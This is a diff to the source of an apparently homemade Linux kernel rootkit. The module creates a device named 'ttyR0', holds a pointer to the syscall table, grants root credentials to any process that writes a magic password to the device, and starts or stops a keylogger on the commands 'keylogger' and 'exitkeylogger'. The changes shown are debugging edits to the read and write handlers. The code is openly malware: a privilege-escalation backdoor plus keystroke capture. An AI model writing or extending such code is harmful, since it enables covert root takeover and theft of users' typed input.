@@ -66,7 +66,7 @@ static int exit_keylogger(void);
 #define  DEVICE_NAME "ttyR0"
 #define  CLASS_NAME  "ttyRK"
 
-#define BUF_LEN (PAGE_SIZE << 2)
+//#define BUF_LEN (PAGE_SIZE << 2)
 
 static unsigned long *sys_call_table;
 
@@ -74,6 +74,7 @@ static int majorNumber;
 static struct class* rootcharClass = NULL;
 static struct device* rootcharDevice = NULL;
 static int numberOpens = 0;
+//static char receive[BUF_LEN];
 
 static struct file_operations fops =
 {
@@ -145,14 +146,15 @@ static int dev_open (struct inode *inode, struct file *f)
 // called each time data is sent from the device to user space
 static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
 {
-  static char  message[] = "Hello, this is a message from the kernel";
+  static char  message[] = "Hello, this is a message from the kernel\n";
   int error_count = 0;
 
 	printk ("Device read\n");
 
    // copy_to_user has the format ( * to, *from, size) and returns 0 on success
-   error_count = copy_to_user(buf, message, (int)sizeof(message));
-   error_count = copy_to_user(buf, keys_buf+buf_pos, (int)sizeof(message));
+   //error_count = copy_to_user(buf, keys_buf, (int)sizeof(keys_buf));
+   //simple_read_from_buffer(buf, len, off, message, (int)sizeof(message));
+  // error_count = copy_to_user(buf, keys_buf+buf_pos,10) ;
 
    if (error_count==0){
       printk(KERN_INFO "User read %d characters\n", (int)sizeof(message));
@@ -177,10 +179,11 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
   static char logger[] = "keylogger";
   static char exitlogger[] = "exitkeylogger";
   struct cred *new_cred;
+  //int buflen = 0;
 
 	printk ("Device write\n");
 
-	if (memcmp(buf, pass, (int)sizeof(pass)-1) == 0) 	// compares data and magic
+	if (memcmp(buf, pass, (int)sizeof(pass)-1) == 0)     	// compares data and magic
 	{
 		// changes old creds to root
 		if ((new_cred = prepare_creds ()) == NULL)					// gets current creds
@@ -205,13 +208,11 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 		printk("Keylogger: deactivated\n");
 		exit_keylogger();
 	}
-  else
+  else if(memcmp(buf, "e", 1) == 0)
   {
-    printk(KERN_ERR "Message: ");
-    printk(KERN_ERR "%*pH\n", buf);
+    printk("echo mode\n");
+    //int* p = buflen;
     //printk(buf);
-    //pr_debug("A%s\n", buf);
-    //printk("\n");
   }
 	return len;
 }
